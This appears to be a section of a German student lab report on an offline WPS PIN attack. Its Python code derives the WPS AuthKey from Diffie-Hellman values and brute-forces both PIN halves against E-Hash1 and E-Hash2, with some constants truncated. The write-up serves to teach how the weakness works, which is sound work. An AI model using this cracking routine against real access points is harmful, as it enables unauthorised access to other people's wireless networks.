\section{WPS}
Im Folgenden sollten wir einen WPS-Offline-Angriff durchführen und den gegebenen Code-Snippet so erweitern, dass er funktioniert.\\
Folgend ist der Ausschnitt zu betrachten mit dem wir zum Ziel gekommen sind.
\begin{verbatim}
EHASH1 = binascii.unhexlify('C5FB...')
EHASH2 = binascii.unhexlify('33D3...')
ENonce = binascii.unhexlify('AB456D913C0BFC13CFA2F9F4F1ABD893')
RNonce = binascii.unhexlify('CBA417007AD25F922ED764B27E790E8B')
PK_E = binascii.unhexlify('86DE...')
PK_R = binascii.unhexlify('4622...')
pubkey_registrar = int("4622...",16)
secret_number = 1631...
shared_key = bignum_pack(pow(pubkey_registrar, secret_number, prime_int), 192)
DHKey_berechnen = hashlib.sha256(shared_key).digest()
DHKey=binascii.unhexlify('6d32...')

# Check ob Berechnung genauso wie gegebener DH-KEy
if(DHKey_berechnen==DHKey):
    print("DHKey_berechnung erfolgreich")

MAC = b"02:00:2e:a9:55:32"
# Schlüsselberechnung
KDK = hmac.new(DHKey, ENonce + MAC + RNonce, hashlib.sha256).digest()
AuthKey, KeyWrapKey, EMSK = kdf(KDK, 'Wi-Fi Easy and Secure Key Derivation'.encode('utf-8'), [256, 128, 256])

def brute_force1():
        for i in range(10000):
            pin1 = f"{i:04d}".encode()
            psk1 = hmac.new(AuthKey, pin1, hashlib.sha256).digest()[:16]

            test_EHash = hmac.new(AuthKey, b'\x00' * 16 + psk1 + PK_E + PK_R, hashlib.sha256).digest()

            if test_EHash == EHASH1:
                return f"GEFUNDEN: {i:04d}"
        return "Kein Treffer"

      
def brute_force2():
    for i in range(10000):
        pin2 = f"{i:04d}".encode()
        psk2 = hmac.new(AuthKey, pin2, hashlib.sha256).digest()[:16]

        test_EHash = hmac.new(AuthKey, b'\x00' * 16 + psk2 + PK_E + PK_R, hashlib.sha256).digest()

        if test_EHash == EHASH2:
            return f"GEFUNDEN: {i:04d}"
    return "Kein Treffer"
\end{verbatim}
Mit den gegebenen Werten haben wir also den Auth-Key berechnet und anschließend mit Brute-Force alle Passwortoptionen getestet. Dort berechnen wir den PSK mit unserem geratenen Passwort und dann den Hash, sodass wir diesen mit dem Ziel-Hash vergleichen können.